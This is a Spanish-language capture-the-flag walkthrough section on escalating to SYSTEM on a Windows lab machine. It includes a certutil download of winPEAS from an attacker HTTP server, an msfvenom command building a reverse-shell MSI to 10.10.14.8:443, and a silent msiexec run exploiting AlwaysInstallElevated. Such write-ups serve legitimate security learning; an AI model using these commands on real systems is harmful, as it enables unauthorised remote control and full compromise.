## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
whoami
whoami /priv
whoami /all
```

Aqui no vemos nada de interesante.

```bash
cd c:\
cd PROGRA~1
dir
cd ..
cd PROGRA~2
dir
```

Investigamos un poco pero no vemos nada muy interesante. Decidimos lanzarle un WinPEAS

#### Analisis de vulnerabilidad Privesc con WINPEAS {-}

```bash
cd c:\Windows\Temp
mkdir EEEE
cd EEEE
```

Descargamos el `winpeasx64.exe` desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).

```bash
cd content
cp /home/s4vitar/Descargas/firefox/winPEASx64.exe .
python3 -m http.server 80
```

Lo descargamos desde la maquina victima y lo lanzamos.

```bash
certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
winPEAS.exe
```

Vemos algo interressante en Checking AlwaysInstallElevated

```{r, echo = FALSE, fig.cap="privesc hklm hkcu vuln", out.width="90%"}
knitr::include_graphics("images/love-hklm-hkcu.png")
```

Podemos seguir los pasos descritos en el link [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)

1. crear un msi malicioso con msfvenom

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f msi -o reverse.msi
    ```

1. lo enviamos a la maquina victima con el servidor http de python
1. nos ponemos en escucha por el puerto 443
1. lo ejecutamos desde la maquina victima

    ```bash
    msiexec /quiet /qn /i reverse.msi
    ```

Ya estamos a dentro con el usuario nt authority\system y podemos ver la flag.